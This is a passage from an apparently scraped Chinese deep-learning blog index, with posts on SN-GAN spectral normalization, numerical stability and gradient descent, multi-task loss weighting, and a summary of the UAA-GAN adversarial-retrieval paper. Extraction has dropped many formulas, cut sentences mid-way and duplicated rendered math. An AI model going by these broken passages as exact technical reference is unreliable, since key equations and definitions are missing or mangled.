penalty正则化方法不稳定，在实验中，当我们使用一个比较大的学习率去训练WGAN-GP的时候，WGAN-GP的表现并不稳定。而且因为WGAN-GP涉及比较多的运算，所以训练的过程也比较耗时。 SN-GAN提出用Spectral Normalization方法来让判别器D满足Lipschitz约束。简单的说，SN-GAN只需要改变判别器权值的最大奇异值。 奇异值是矩阵里面的概念，一般通过奇异值分解定理求得。设A为mxn阶矩阵，q=min(m,n)，AxA的q个非负特征值的算术平方根叫做A的奇异值。 ¶L约束 所以，大多数时候我们都希望模型对输入扰动是不敏感的，这通常能提高模型的泛化性能。也就是说，我们希望很小时： 也尽可能地小。当然，“尽可能”究竟是怎样，谁也说不准。于是Lipschitz提出了一个更具体的约束，那就是存在某个常数CC（它只与参数有关，与输入无关），使得下式恒成立 换言之，在这里我们认为满足L约束的模型才是一个好模型并且对于具体的模型，我们希望估算出C(w)的表达式，并且希望C(w)越小越好，越小意味着它对输入扰动越不敏感，泛化性越好。 经过一番数学推导我们可以得到F函数是C的一个具体值： 为了让一个模型更好的服从Lipschitz约束，即让模型更加的平滑，就应当最小化参数C。我们可以将作为一个惩罚项带入普通监督模型的损失函数中，以此来让模型更加平滑。 将代入上式。 这其实就是一个正则项。从而可以的出来一个结论，即一个神经网络模型添加了正则项之后，模型的泛华能力以及抗干扰能力会更强，这样符合常识，前面的内容就是从数据的角度证明了这个常识背后的机理。 ¶SN-GAN loss SN-GAN中使用了一个叫做Spectral Normalization的方法非常简单。就是判别器的所有权重都进行除以谱范数的操作即, 这样做之所以有效的原因和F函数是一样的。 我们知道传统的GAN如果不加上Lipschitz约束，判别器就会被无线优化，导致判别器与生成器能力之间失衡，造成GAN难以训练，而WGAN，WGAN-GP都通过不同的方式让GAN的判别器服从Lipschitz约束，但是都有各自的问题。其中WGAN-GP梯度惩罚的方式可以满足比较多的情况，但是训练比较慢，随着训练的进行，梯度会出现波动。还有一个值得关注的问题，就是对于类别数据训练，WGAN-GP得不到比较理想的效果，这是因为梯度惩罚方式只针对生成数据分布于真实数据分布之间的空间分布中的数据进行梯度政法，无视其他空间。这种方式使得 它难以处理多类别数据，多类别数据在空间分布中是多样的，因此WGAN0-GP就不知道到底把哪里作为惩罚空间。从而得不到比较好的效果。 对SN-GAN而言，它将谱正则化的思想运用到GAN中，从而提出了谱归一化，通过谱归一化的方式让GAN满足1-Lipschitz约束。 你可以通过公式证明是严格服从1-Lipschitz约束的。 在训练的过程中，因为直接计算谱范数是比较耗时的，为了让模型训练的时候速度比较快，就需要使用一个技巧。power iteration方法通过迭代计算的思想可以比较快速地计算出谱范数的近似值。 所谓的power iteration就是通过下面的迭代格式进行迭代计算。 若干次迭代后，就可以得到谱范数的近似值。 ¶部分关键代码 1234567891011121314151617181920# l2 正则化def _l2normalize(v, eps=1e-12): return v / (torch.norm(v) + eps)def max_singular_value(W, u=None, Ip=1): &quot;&quot;&quot; power iteration for weight parameter &quot;&quot;&quot; #xp = W.data if not Ip &gt;= 1: raise ValueError(&quot;Power iteration should be a positive integer&quot;) if u is None: u = torch.FloatTensor(1, W.size(0)).normal_(0, 1).cuda() _u = u # 迭代近似计算 for _ in range(Ip): _v = _l2normalize(torch.matmul(_u, W.data), eps=1e-12) _u = _l2normalize(torch.matmul(_v, torch.transpose(W.data, 0, 1)), eps=1e-12) sigma = torch.sum(F.linear(_u, torch.transpose(W.data, 0, 1)) * _v) return sigma, _u 123456789101112131415161718192021222324class SNConv2d(conv._ConvNd): def __init__(self, in_channels, out_channels, kernel_size, stride=1, padding=0, dilation=1, groups=1, bias=True): &quot;&quot;&quot; 在计算卷积的时候对权重添加惩罚项 &quot;&quot;&quot; kernel_size = _pair(kernel_size) stride = _pair(stride) padding = _pair(padding) dilation = _pair(dilation) super(SNConv2d, self).__init__( in_channels, out_channels, kernel_size, stride, padding, dilation, False, _pair(0), groups, bias) self.register_buffer(&#x27;u&#x27;, torch.Tensor(1, out_channels).normal_()) @property def W_(self): w_mat = self.weight.view(self.weight.size(0), -1) sigma, _u = max_singular_value(w_mat, self.u) self.u.copy_(_u) return self.weight / sigma def forward(self, input): return F.conv2d(input, self.W_, self.bias, self.stride, self.padding, self.dilation, self.groups)","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}]},{"title":"「花书」数值计算","slug":"「花书」数值计算","date":"2021-08-05T06:01:02.000Z","updated":"2021-08-13T14:20:51.170Z","comments":true,"path":"2021/08/05/「花书」数值计算/","link":"","permalink":"http://blog.keter.top/2021/08/05/%E3%80%8C%E8%8A%B1%E4%B9%A6%E3%80%8D%E6%95%B0%E5%80%BC%E8%AE%A1%E7%AE%97/","excerpt":"","text":"¶前言 当前有跟着老师做一些深度学习的研究，在研究的过程中我意识到了深度学习基础知识的重要性。所以回来把花书好好的啃一遍。这篇文章是这个系列的第一篇，希望我能够坚持把这本书给啃完吧😊。 在机器学习领域经常需要进行大量的数值计算，常见的操作有优化（optimization，找到一个任务达到最大值/最小值时的参数）和线性方程的解决系统。当一个方程中包含着大到内存都装不下的实数时，即使只是评估一个数学方程对于电子计算机而言也是非常困难的。使用计算机的有限来毕竟一些无限的数，这个本身就是矛盾的。花书中本章主要就是解决这样的问题 ¶上溢和下溢 在数字计算机中一个最基本的问题就是我们需要在有限的数字系统中去表示无限多个实数。这意味着当我们在使用计算书表示数字的时候几乎所有的实数都会产生一个近似误差。很多情况下这个误差都是可以忽略的。书中叫他rounding error，可以很直观的感觉出来就是误差中的“边缘人士”。但是rounding error在多个操作中如果积累的过多也会造成实验的失败。 rounding error的一种经典的形式就是下溢 underflowunderflowunderflow。下溢发生在数字接近0的时候。举一个例子，我们经常会避免除数为0的情况（在一些硬件环境下会报错，有的环境会返回一个not-a-number的值）同样的我们也会避免对0求对数。 另一种形式的rounding error叫做上溢 overflowoverflowoverflow​. 上溢发生在一个数字非常的大的时候（接近正无穷和负无穷）。上溢和下溢都是rounding error,是我们在进行数值计算的时候应该尽量避免的。在训练的过程中我们也知道loss是nan肯定不是啥好事。 一个必须对抗上溢和下溢情况的函数就是softmax函数了，softmax函数的定义如下： softmax(x)i=exp(xi)∑j=1nexp(xj)softmax(x)_i = \\frac{exp(x_i)}{\\sum_{j=1}^nexp(x_j)} softmax(x)i​=∑j=1n​exp(xj​)exp(xi​)​ 上溢和下溢会对softmax函数产生比较大的影响。假设所有的xix_ixi​。 代码实现： 12345678import numpy as npimport numpy.linalg as lax = np.array([1e7,1e8,2e5,2e7])y = np.exp(x)/sum(np.exp(x))print(&#x27;上溢：&#x27;,y)x = x-np.max(x) # 减去最大值y = np.exp(x)/sum(np.exp(x))print(&quot;上溢处理：&quot;,y) 12上溢： [nan nan nan nan]上溢处理： [0. 1. 0. 0.] 这样就行优化之后其实还有一个问题就是如果输入的全部都是0的话还是会产生下溢的问题。这意味着如果我们在这个情况下将softmax计算的结果在传入一个log函数中时我们将会得到负无穷这一个错误的结果。当然了我们也可以使用让softmax稳定的方法来让log函数稳定。 1234567891011x = np.array([-1e10,-1e9,-2e10,-1e10])y = np.exp(x) / sum(np.exp(x))print(&quot;下溢：&quot;,y)x = x-np.max(x)y = np.exp(x)/sum(np.exp(x))print(&quot;下溢处理：&quot;,y)print(&quot;log softmax(x):&quot;,np.log(y))# 对log softmax 函数进行下溢处理y = x - np.log(sum(np.exp(x)))print(&quot;logsoftmax(x):&quot;, y) 1234下溢： [nan nan nan nan]下溢处理： [0. 1. 0. 0.]log softmax(x): [-inf 0. -inf -inf]logsoftmax(x): [-9.0e+09 0.0e+00 -1.9e+10 -9.0e+09] 花书中写了，一个好的框架的底层库应该都已经帮你尽可能的解决了这些问题。如果你不是一个底层框架的开发人员那么你大可以调用别人写好的库。但是如果你是一个框架底层的开发人员那么你就要把这些数字计算的问题印在心中。 ¶Poor Conditioning Conditioning 表示一个函数对于细小的输入变化有多快。对于科学计算来说一个函数如果输入有轻微的变化，函数结果也跟着有非常大的变化将会成为一个非常大的问题。因为输入中的rounding error在输出时会变的非常巨大。 举一个例子，一个函数f(x)=A−1xf(x)=A^{-1}xf(x)=A−1x)为: max⁡i,j∣λiλj∣\\max _{i, j}\\left|\\frac{\\lambda_{i}}{\\lambda_{j}}\\right| i,jmax​∣∣∣∣∣​λj​λi​​∣∣∣∣∣​ 这个比例就是最大的特征值与最小特征值之间的比例。当这个值较大的时候，矩阵的逆就会对输入误差敏感。这种敏感是矩阵本身的特性，而不是因为求逆取整误差带来的。 这一点也是比较底层的计算特性，花书的作者也自己用C和CUDA去写过深度计算框架darknet，所以他在介绍的时候会介绍一些偏底层的内容。我们如果使用成熟的框架的话就可以少考虑这一类的问题。 ¶基于梯度的优化器 大多数的深度学习算法都要用到优化器( optimiztionoptimiztionoptimiztion​ 达到最大值或者最小值。 简单的来说优化器就是通过求导的方式让函数的值达到最大值或者最小值。 导数经常被用来求一个函数的最值，因为它告诉了我们怎样去改变x来优化yyy 这是因为我们在进行梯度更新的时候都是一小步一小步的会通过学习率来限制学习速度。 当导数等于0的时候，求导就不能给我们的更新方向提供信息了。导数等于0的点叫做stationary points。当一个地方导数等于0但是有其他的点数值比该点小的话，这个点就叫做局部极小点。花书中还对鞍点等梯度下降容易出现的问题进行了描述，这里就不再赘述了。 总结一下就是：梯度下降法（Gradient Descent）的目标函数是最小化具有多维的输入：f:Rn→Rf: \\mathbb{R}^{n} \\rightarrow \\mathbb{R}f:Rn→R​。梯度下降法建议的新的点为： x′=x−ϵ∇xf(x)\\boldsymbol{x}^{\\prime}=\\boldsymbol{x}-\\epsilon \\nabla_{\\boldsymbol{x}} f(\\boldsymbol{x})x′=x−ϵ∇x​f(x) 现在我们使用代码来用梯度下降算法实现求解一个函数的解。 [例子] 首先引入线性最小二乘公式： f(x)=12∥Ax−b∥22f(\\boldsymbol{x})=\\frac{1}{2}\\|\\boldsymbol{A} \\boldsymbol{x}-\\boldsymbol{b}\\|_{2}^{2}f(x)=21​∥Ax−b∥22​ 建设我们希望找到最小化该式的 xxx 值。 可以计算梯度得到： ∇xf(x)=A⊤(Ax−b)=A⊤Ax−A⊤b\\nabla_{\\boldsymbol{x}} f(\\boldsymbol{x})=\\boldsymbol{A}^{\\top}(\\boldsymbol{A} \\boldsymbol{x}-\\boldsymbol{b})=\\boldsymbol{A}^{\\top} \\boldsymbol{A} \\boldsymbol{x}-\\boldsymbol{A}^{\\top} \\boldsymbol{b} ∇x​f(x)=A⊤(Ax−b)=A⊤Ax−A⊤b 那么我们就根据梯度下降算法来求解该式最小时的 xxx 值。 12345678import numpy as np# 初始化参数x0 = np.array([1.0,1.0,1.0])A = np.array([[1.0,-2.0,1.0],[0.0,2.0,-8.0],[-4.0,5.0,9.0]])b = np.array([0.0,8.0,-9.0])epsilon = 0.001 # 学习率delta = 1e-3 # 允许的误差值# 这里正确的解为： [29, 16, 3] 1234567891011121314151617181920def matmul_chain(*args): &quot;&quot;&quot; 矩阵相乘 &quot;&quot;&quot; if len(args) == 0: return np.nan result = args[0] for x in args[1:]: result = result@x return resultdef gradient_decent(x, A, b, epsilon, delta): # 当梯度更新不动的时候就停止 while la.norm(matmul_chain(A.T, A, x)-matmul_chain(A.T, b)) &gt; delta: # 梯度更新 x -= epsilon*(matmul_chain(A.T, A, x)-matmul_chain(A.T, b)) return xgradient_decent(x0, A, b, epsilon, delta)# out: array([27.82277014, 15.34731055, 2.83848939]) 仅使用梯度信息的优化算法称为一阶优化算法，如梯度下降。使用Hessian矩阵的优化算法称为二阶最优化算法，如牛顿法。 但是在深度系中使用的函数族都是相当复杂的，所以深度学习算法往往缺乏理论保证。在许多其他领域，优化的主要方法是为有限的函数族设计优化算法。 在深度学习的背景下，限制函数满足Lipschitz连续，或其导数Lipschitz连续可以获得一些保证。Lipschitz连续函数的变化速度以Lipschitz常数为界： ¶线性约束 有些时候我们并不是希望函数f(x)f(x)f(x))。 约束优化的一个简单方法是将约束考虑在内后简单地对梯度下降进行更改。 … 等待更新","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"花书","slug":"深度学习基础知识/花书","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E8%8A%B1%E4%B9%A6/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"花书","slug":"花书","permalink":"http://blog.keter.top/tags/%E8%8A%B1%E4%B9%A6/"}]},{"title":"「基础知识」多任务损失函数设计策略","slug":"【基础知识】多任务损失函数设计策略","date":"2021-08-04T06:01:02.000Z","updated":"2021-08-13T14:31:34.000Z","comments":true,"path":"2021/08/04/【基础知识】多任务损失函数设计策略/","link":"","permalink":"http://blog.keter.top/2021/08/04/%E3%80%90%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E3%80%91%E5%A4%9A%E4%BB%BB%E5%8A%A1%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%AD%96%E7%95%A5/","excerpt":"","text":"在多任务学习中，多个任务联合求解，共享归纳偏差。多任务学习本质上是一个多目标问题，因为不同的任务可能会发生冲突，需要进行权衡。一个常见的折衷办法是优化一个代理目标，使每个任务的加权线性组合损失最小化。但是，这种变通方法只有在任务没有竞争的情况下才有效，而这种情况很少发生。其实可以将多任务学习明确地定义为多目标优化问题，其总体目标是寻找一个帕累托最优解。 ¶多任务学习 大多数机器学习模型都是独立来进行学习的，即单任务学习（single-task learning）。也就是说，我们针对一个特定的任务，设计一个模型，然后进行迭代优化。对于稍复杂一点的任务，我们也习惯于通过进行拆解的方式，来对任务的每个部分进行建模。这样存在一个很明显的问题，在对每个子任务进行建模的时候，很容易忽略任务之间的关联、冲突和约束等关系，导致多个任务的整体效果无法更优。 多任务学习（multi-task learning），就是与单任务学习相对的一个概念。在多任务学习中，往往会将多个相关的任务放在一起来学习。例如在推荐系统中，排序模型同时预估候选的点击率和浏览时间。相对于单任务学习，多任务学习有以下优势： 多个任务共享一个模型，占用内存量减少； 多个任务一次前向计算得出结果，推理速度增加； 关联任务通过共享信息，相互补充，可以提升彼此的表现。 ¶多目标优化问题 统计学中最令人惊讶的结果之一是斯坦悖论。Stein (1956)指出：即使在高斯分布是独立的情况下，使用三个或三个以上的高斯随机变量的样本来估计它们的平均值比单独估计它们要好。斯坦悖论是多任务学习(MTL)的早期动机(Caruana，1997) ，这是一种学习范式，其中来自多个任务的数据被用于希望获得优于单独学习每个任务的性能。MTL 的潜在优势超越了斯坦悖论的直接含义，**因为即使是看起来毫不相关的现实世界任务，由于产生数据的共享过程，也有很强的依赖性。**例如，尽管自动驾驶和物体操纵看起来是不相关的，但是基础数据是由相同的光学定律，材料属性和动力学定律支配的。这激发了在学习系统中使用多任务作为归纳偏见。 一个典型的 MTL 系统是为每个点的各种任务提供一组输入点和目标集。在任务之间建立归纳偏差的一种常见方法是设计一个参数化假设类，在任务之间共享一些参数。通常，这些参数是通过求解一个最小化每个任务的损失和的最优化问题来学习的。然而，线性组合公式只有在参数设置对所有任务都有效时才是合理的。换句话说，经验风险的加权和最小化只有在任务没有竞争的情况下才有效，而这种情况很少发生。具有冲突目标的 MTL 需要在任务之间进行权衡的建模，这超出了线性组合的能力范围。 两个任务共享了input层和share bottom层，然后两个tower分别拟合两个任务的输出。对于多任务的loss，最简单的方式是直接将这两个任务的loss直接相加，得到整体的loss，那么loss函数为： L=∑LiL = \\sum L_i L=∑Li​ 这种loss计算方式的不合理之处是显而易见的，不同任务loss的量级很有可能不一样，loss直接相加的方式有可能会导致多任务的学习被某个任务所主导或学偏。当模型倾向于去拟合某个任务时，其他任务的效果往往可能受到负面影响，效果会相对变差。（就像做跷跷板一样，某一项太重了点话游戏就无法进行下去了） 对于为了避免学习任务偏向于某一项的loss，我们可以通过对每个任务的loss配置一个固定的权重参数。 公式如下： L=∑iwi(t)⋅LiL = \\sum_i w_i(t) \\cdot L_i L=i∑​wi​(t)⋅Li​ 但是这样手动的划分权重也会有很大的问题，因为我们并不知道高纬度的特征到底是对于哪一项比较看重。**对更新快的方向，使用小一点的权重，对更新慢的方向，使用大一点的权重。**想要确认合适的权重往往就需要大量的实验。 ¶梯度标准化 《Gradnorm: Gradient normalization for adaptive loss balancing in deep multitask networks》 主要目的： 希望不同的任务Loss量级接近； 不同的任务以相近的速度来进行学习。 实现： 本文定义了两种类型的Loss：Label Loss 和 Gradient Loss。注意：这两种Loss独立优化，不进行相加。 Label Loss即多任务学习中，每个任务的真实的数据标签与网络预测标签计算的loss。Label Loss由学习任务的性质决定，比如分类的loss或者回归的loss。Label Loss通过对不同任务的Loss进行加权求和来实现： L=∑iwi(t)⋅LiL = \\sum_i w_i (t) \\cdot L_i L=i∑​wi​(t)⋅Li​ **Gradient Loss，**用来衡量每个任务的loss的权重wi(t)w_i(t)wi​(t)的函数。 每个任务的权重wi(t)w_i(t)wi​(t)是一个变量（注意这里w与网络参数W是不同的)，w也通过梯度下降进行更新，t表示当前处于网络训练的第t步。 ¶Gradient Loss 用来衡量任务loss量级的变量 GW(i)(t)=∥∇Wwi(t)Li(t)∥2GˉW(t)=Etask[GW(i)(t)j^]\\begin{array}{l} G_{W}^{(i)}(t)=\\left\\|\\nabla_{W} w_{i}(t) L_{i}(t)\\right\\|_{2}\\\\ \\bar{G}_{W}(t)=E_{\\mathrm{task}}\\left[G_{W}^{(i)}(t) \\hat{j}\\right] \\end{array} GW(i)​(t)=∥∇W​wi​(t)Li​(t)∥2​GˉW​(t)=Etask​[GW(i)​(t)j^​]​ W是整个多任务学习网络参数的子集，在文章中的实验，作者选择了网络share bottom部分最后一层的参数； GiW(t)G_{i}^{W}(t)GiW​(t)求梯度实现。 用来衡量任务的学习速度的变量 L~i(t)=Li(t)/Li(0)ri(t)=L~i(t)/Etask⁡[L~i(i)]\\begin{aligned} \\tilde{L}_{i}(t) &amp;=L_{i}(t) / L_{i}(0) \\\\ r_{i}(t) &amp;=\\tilde{L}_{i}(t) / E_{\\operatorname{task}}\\left[\\tilde{L}_{i}(i)\\right] \\end{aligned} L~i​(t)ri​(t)​=Li​(t)/Li​(0)=L~i​(t)/Etask​[L~i​(i)]​ Li(t)L_{i}(t)Li​(t)​​越大则表示网络训练的越慢（在一定程度上衡量了训练的速度）。 Etask[L~i(t)]E_{t a s k}\\left[\\tilde{L}_{i}(t)\\right]Etask​[L~i​(t)]​​​表示了各个任务反向训练速度的期望； 其实这里我感觉处以Li(0)L_i(0)Li​(0)​​会根加合适一些。 最终的公式 Lgrad(t;wi(t))=∑i∣GW(i)(t)−GˉW(t)×[ri(t)]α∣1L_{\\mathrm{grad}}\\left(t ; w_{i}(t)\\right)=\\sum_{i}\\left|G_{W}^{(i)}(t)-\\bar{G}_{W}(t) \\times\\left[r_{i}(t)\\right]^{\\alpha}\\right|_{1}Lgrad​(t;wi​(t))=∑i​∣∣∣∣​GW(i)​(t)−GˉW​(t)×[ri​(t)]α∣∣∣∣​1​ 计算完Gradient Loss后，通过以下函数对wi(t)w_{i}(t)wi​(t)进行更新(GL指Gradient Loss)： 那么就可以看到： ri(t)r_{i}(t)ri​(t)减小 GˉW(t)\\bar{G}_{W}(t)GˉW​(t) 会变大，导致loss增加，从而促使loss量级接近； Gradient loss的更新公式如下： wi(t+1)=wi(t)+λ∗Gradient⁡(GL,wi(t))w_{i}(t+1)=w_{i}(t)+\\lambda * G \\operatorname{radient}\\left(G L, w_{i}(t)\\right) wi​(t+1)=wi​(t)+λ∗Gradient(GL,wi​(t)) ¶训练流程 初始化各个loss的权重为1，初始化网络参数，配置 α\\alphaα 的值，选择参数W。 通过加权求和的方式计算网络的loss。 计算梯度标准化的值GiW(t)G_{i}^{W}(t)GiW​(t) ； 计算全局梯度标准化的值wi(t)w_{i}(t)wi​(t) ; 计算Gradient Loss； 计算Gradient Loss对wi(t)w_{i}(t)wi​(t) ;求导的值； 通过第6步的结果更新wi(t)w_{i}(t)wi​(t)​ ; 通过第2步的结果更新整个网络的参数； 把第7步的结果renormalize一下，使得wi(t)w_{i}(t)wi​(t) ;的和等于任务数量。 ¶优缺点 Gradient Normalization既考虑了loss的量级，又考虑了不同任务的训练速度。 每一步迭代都需要额外计算梯度，当W选择的参数多的时候，会影响训练速度； 此外，Li(0)L_i(0)Li​(0)C是类别数量。 ¶动态平均加权 《End-to-End Multi-Task Learning with Attention》，CVPR 2019，Cites：107 主要思想 希望各个任务以相近的速度来进行学习 实现 wi(t)=Nexp⁡(ri(t−1)/T)∑nexp⁡(rn(t−1)/T),rn(t−1)=Ln(t−1)Ln(t−2)w_{i}(t)=\\frac{N \\exp \\left(r_{i}(t-1) / T\\right)}{\\sum_{n} \\exp \\left(r_{n}(t-1) / T\\right)}, r_{n}(t-1)=\\frac{L_{n}(t-1)}{L_{n}(t-2)} wi​(t)=∑n​exp(rn​(t−1)/T)Nexp(ri​(t−1)/T)​,rn​(t−1)=Ln​(t−2)Ln​(t−1)​ wi(t)w_{i}(t)wi​(t)​代表了每个任务i的权重 Ln(t−1),rn(t−1)L_{n}(t-1), \\quad r_{n}(t-1)Ln​(t−1),rn​(t−1)​​。 NNN​是任务的数量 T是一个常数，T=1时，w等同于softmax的结果；T足够大时，w趋近1，各个任务的loss权重相同。 直观来看，loss缩小快的任务，则权重会变小；反之权重会变大。 优缺点： 优点：只需要记录不同step的loss值，从而避免了为了获取不同任务的梯度，运算较快。 缺点：没有考虑不同任务的loss的量级，需要额外的操作把各个任务的量级调整到差不多。 ¶动态任务优先级 《Dynamic task prioritization for multitask learning》，ECCV 2018，Cites：53 主要思路 让更难学的任务具有更高的权重； 实现 wi(t)=−(1−κi(t))γilog⁡κi(t)w_{i}(t)=-\\left(1-\\kappa_{i}(t)\\right)^{\\gamma_{i}} \\log \\kappa_{i}(t) wi​(t)=−(1−κi​(t))γi​logκi​(t) wi(t)w_i(t)wi​(t)代表了每个任务i的权重； ki(t)k_i(t)ki​(t)；KPI与任务的训练难度成反比，即KPI越高，任务越好学； γi\\gamma_{i}γi​允许为特定的任务i来调整权重（留了一些手动调整的空间) 直观来看，KPI高的任务，学习起来比较简单，则权重会变小；反之，难学的任务权重会变大。 评价 优点：需要获取不同step的KPI值，从而避免了为了获取不同任务的梯度，运算较快 缺点：DTP没有考虑不同任务的loss的量级，需要额外的操作把各个任务的量级调整到差不多；且需要经常计算KPI. 方法 平衡loss量级 平衡学习速度 高权重任务 需要计算梯度 需要额外权重操作 动机 GradNorm ✓\\checkmark✓ 平衡学习速度和loss量级 DWA ✓\\checkmark✓ 平衡学习速度 DTP ✓\\checkmark✓ 给难学的任务分配高权重","categories":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"深度学习基础知识","slug":"深度学习基础知识","permalink":"http://blog.keter.top/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"}]},{"title":"「论文阅读」UAA-GAN","slug":"【论文阅读】UAA-GAN","date":"2021-07-27T06:01:02.000Z","updated":"2021-08-13T14:37:52.000Z","comments":true,"path":"2021/07/27/【论文阅读】UAA-GAN/","link":"","permalink":"http://blog.keter.top/2021/07/27/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91UAA-GAN/","excerpt":"","text":"Unsupervised Adversarial Attacks on Deep Feature-based Retrieval with GAN 这是一篇用GAN攻击神经网络的一篇文档，文中提出的UAA-GAN可以用于攻击图像检索网络如ReID等。 ¶介绍 深层神经网络(Deep neural networks，dnn)是一种功能强大的特征表示学习工具，能够实现基于内容的图像检索(content-based image retrieval，CBIR)。近年来，深度特征正在迅速取代传统的图像特征，这些特征依赖于手工制作的关键点检测器和描述符。基于 dnn 的模型通过聚合预先训练的深层神经网络顶层的激活，生成一个图像的深层特征描述符，然后根据图像特征向量的欧几里得度量或余弦距离来确定图像之间的相似度(或距离)。据观察，这种方法比那些低层次的基于关键点的特征能够保存更多抽象和全局的语义信息。由于 DNN 具有良好的表示能力，许多研究者致力于通过学习鉴别特征表示来提高检索的准确性。然而，DNN 特征在检索过程中的鲁棒性和稳定性却被忽视了。 众所周知，基于 DNN 的分类系统很容易受到Adversarial image的影响: 通过对输入图像添加一些精心制作的微小扰动，目标 DNN 经常被误导，并以高置信度预测图像到错误的类别。对抗性的例子首先在文献[1]中介绍，扰动是通过调整输入以获得最大化的分类错误而产生的。很多注意力被吸引到对抗性攻击和防御之间的竞争。 基于深度特征的基于内容的图像检索(CBIR)系统及其衍生应用——人脸识别(ReID)和人脸搜索(face search)也容易受到对抗性攻击。也就是说，有可能篡改图像，使其在视觉上与原始形式几乎相同，但几乎不可能在图像检索系统中进行搜索。由于两个主要原因，攻击图像检索系统比攻击分类模型更具挑战性。 ¶网络结构设计 其实本篇论文对于GAN的网络并没有太大的创新，主要是改进点在于增加了生成器的损失项。生成器的骨干部分使用的是CGAN。 下图是他的网络结构图： 该框架的设计目标是通过生成一个带有特定扰动的对抗性示例，来攻击构建在特定目标特征提取网络上的检索系统。 ¶生成器损失函数 生成器的损失函数主要由三部分组成： 第一部分用与衡量生成的图片与原有图片特征图上的不同，目的是让生成图片的特征图与原有图片的特征图差距越大越好。 maximize⁡d(fx,fx~) s.t. ∥δ∥∞≤ϵ,x~∈[0,1]\\begin{aligned} \\operatorname{maximize} &amp; d\\left(f_{\\boldsymbol{x}}, f_{\\tilde{\\boldsymbol{x}}}\\right) \\\\ \\text { s.t. } &amp;\\|\\delta\\|_{\\infty} \\leq \\epsilon, \\\\ &amp; \\tilde{\\boldsymbol{x}} \\in[0,1] \\end{aligned} maximize s.t. ​d(fx​,fx~​)∥δ∥∞​≤ϵ,x~∈[0,1]​ LGAN−G=Ex~∼p(x~∣x)[(D(x~)−1)2]\\mathcal{L}_{G A N_{-} G}=\\mathbb{E}_{\\tilde{\\boldsymbol{x}} \\sim p_{(\\tilde{\\boldsymbol{x}} \\mid \\boldsymbol{x})}}\\left[(D(\\tilde{\\boldsymbol{x}})-1)^{2}\\right] LGAN−​G​=Ex~∼p(x~∣x)​​[(D(x~)−1)2] 第二部分用与衡量原图与生成图像的差距，也就是生成的图像和攻击图像肉眼看起来有多大的不同。目的是让生成的攻击图像和原图像看起来几乎没有什么差距。 Lrecon =∥x~−x∥2\\mathcal{L}_{\\text {recon }}=\\|\\tilde{\\boldsymbol{x}}-\\boldsymbol{x}\\|_{2} Lrecon ​=∥x~−x∥2​ 第三项的loss使用了 triplet loss和online hard negative mining的设计思路。现在假设&lt;x,x~,x′&gt;&lt;\\boldsymbol{x}, \\tilde{\\boldsymbol{x}}, \\boldsymbol{x}^{\\prime}&gt;&lt;x,x~,x′&gt;​​之间的距离。可以用如下公式表示： d(fx,fx′)+m+≤d(fx,fx~)d\\left(f_{\\boldsymbol{x}}, f_{\\boldsymbol{x}^{\\prime}}\\right)+m+\\leq d\\left(f_{\\boldsymbol{x}}, f_{\\tilde{\\boldsymbol{x}}}\\right) d(fx​,fx′​)+m+≤d(fx​,fx~​) 所以第三项损失就可以写成： Lmetric =max⁡(d(fx,fx′)+m−d(fx,fx~),0)\\mathcal{L}_{\\text {metric }}=\\max \\left(d\\left(f_{\\boldsymbol{x}}, f_{\\boldsymbol{x}^{\\prime}}\\right)+m-d\\left(f_{\\boldsymbol{x}}, f_{\\tilde{\\boldsymbol{x}}}\\right), 0\\right) Lmetric ​=max(d(fx​,fx′​)+m−d(fx​,fx~​),0) 生成器部分的完整损失就是： LG=LGAN−G+λrLrecon +λmLmetric \\mathcal{L}_{G}=\\mathcal{L}_{G A N_{-} G}+\\lambda_{r} \\mathcal{L}_{\\text {recon }}+\\lambda_{m} \\mathcal{L}_{\\text {metric }} LG​=LGAN−​G​+λr​Lrecon ​+λm​Lmetric ​ ¶鉴别器损失函数 鉴别器损失函数就非常普通了，就是可以鉴别出来哪些图片是真的，哪些图片是假的即可。 LGAN−D=Ex∼pdata⁡(x)[(D(x)−1)2]+Ex~∼p(x~∣x)[(D(x~))2]\\mathcal{L}_{G A N_{-} D}=\\mathbb{E}_{\\boldsymbol{x} \\sim p_{\\operatorname{data}(\\boldsymbol{x})}}\\left[(D(x)-1)^{2}\\right]+\\mathbb{E}_{\\tilde{\\boldsymbol{x}} \\sim p_{(\\tilde{\\boldsymbol{x}} \\mid \\boldsymbol{x})}}\\left[(D(\\tilde{\\boldsymbol{x}}))^{2}\\right] 